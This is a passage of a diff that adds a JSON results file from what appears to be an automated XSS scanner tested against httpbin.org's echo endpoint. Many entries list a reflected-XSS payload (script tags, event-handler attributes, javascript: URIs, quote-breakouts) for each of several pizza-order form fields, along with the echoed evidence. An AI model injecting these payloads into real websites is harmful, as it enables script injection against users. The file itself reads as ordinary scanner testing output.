+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\\\";alert('XSS');//\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"112\", \n    \"Content-Type\": \"application/x-www-form-urlencode",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "</script><script>alert('XSS')</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"</script><script>alert('XSS')</script>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"139\", \n    \"Content-Type\": \"application/",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<script>alert(String.fromCharCode(88,83,83))</script>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"152\", \n    \"Content-Type\"",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<script>alert(/XSS/)</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<script>alert(/XSS/)</script>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"124\", \n    \"Content-Type\": \"application/x-www-for",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<script>alert`XSS`</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<script>alert`XSS`</script>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"118\", \n    \"Content-Type\": \"application/x-www-form-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custtel",
+      "payload": "<script>alert(1)</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"<script>alert(1)</script>\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"116\", \n    \"Content-Type\": \"application/x-www-form-ur",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<script>alert('XSS')</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<script>alert('XSS')</script>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"124\", \n    \"Content-Type\": \"application/x-www-for",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<img src=x onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<img src=x onerror=alert('XSS')>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"125\", \n    \"Content-Type\": \"application/x-www-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<svg onload=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<svg onload=alert('XSS')>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"116\", \n    \"Content-Type\": \"application/x-www-form-ur",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "javascript:alert('XSS')",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"javascript:alert('XSS')\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"110\", \n    \"Content-Type\": \"application/x-www-form-urle",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<iframe src=javascript:alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<iframe src=javascript:alert('XSS')>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"129\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<body onload=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<body onload=alert('XSS')>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"117\", \n    \"Content-Type\": \"application/x-www-form-u",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<input onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<input onfocus=alert('XSS') autofocus>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"129\", \n    \"Content-Type\": \"application/",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<select onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<select onfocus=alert('XSS') autofocus>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"130\", \n    \"Content-Type\": \"application",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<textarea onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<textarea onfocus=alert('XSS') autofocus>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"132\", \n    \"Content-Type\": \"applicati",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<keygen onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<keygen onfocus=alert('XSS') autofocus>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"130\", \n    \"Content-Type\": \"application",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<video><source onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<video><source onerror=alert('XSS')>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"131\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<audio src=x onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<audio src=x onerror=alert('XSS')>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"127\", \n    \"Content-Type\": \"application/x-ww",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<details open ontoggle=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<details open ontoggle=alert('XSS')>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"127\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "';alert('XSS');//",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"';alert('XSS');//\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"112\", \n    \"Content-Type\": \"application/x-www-form-urlencoded",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "\";alert('XSS');//",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\\\";alert('XSS');//\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"112\", \n    \"Content-Type\": \"application/x-www-form-urlencode",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "</script><script>alert('XSS')</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"</script><script>alert('XSS')</script>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"139\", \n    \"Content-Type\": \"application/",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<script>alert(String.fromCharCode(88,83,83))</script>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"152\", \n    \"Content-Type\"",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<script>alert(/XSS/)</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<script>alert(/XSS/)</script>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"124\", \n    \"Content-Type\": \"application/x-www-for",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<script>alert`XSS`</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<script>alert`XSS`</script>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"118\", \n    \"Content-Type\": \"application/x-www-form-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "custemail",
+      "payload": "<script>alert(1)</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"<script>alert(1)</script>\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"116\", \n    \"Content-Type\": \"application/x-www-form-ur",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<script>alert('XSS')</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<script>alert('XSS')</script>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"119\", \n    \"Content-Type\": \"application/x-www-form-url",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<img src=x onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<img src=x onerror=alert('XSS')>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"120\", \n    \"Content-Type\": \"application/x-www-form-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<svg onload=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<svg onload=alert('XSS')>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"111\", \n    \"Content-Type\": \"application/x-www-form-urlenco",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "javascript:alert('XSS')",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"javascript:alert('XSS')\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"105\", \n    \"Content-Type\": \"application/x-www-form-urlencode",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<iframe src=javascript:alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<iframe src=javascript:alert('XSS')>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"124\", \n    \"Content-Type\": \"application/x-www-f",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<body onload=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<body onload=alert('XSS')>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"112\", \n    \"Content-Type\": \"application/x-www-form-urlenc",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<input onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<input onfocus=alert('XSS') autofocus>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"124\", \n    \"Content-Type\": \"application/x-www",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<select onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<select onfocus=alert('XSS') autofocus>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"125\", \n    \"Content-Type\": \"application/x-ww",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<textarea onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"<textarea onfocus=alert('XSS') autofocus>\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"127\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "size",
+      "payload": "<keygen onfocus=alert('XSS') autofocus>",
+      "method": "POST",
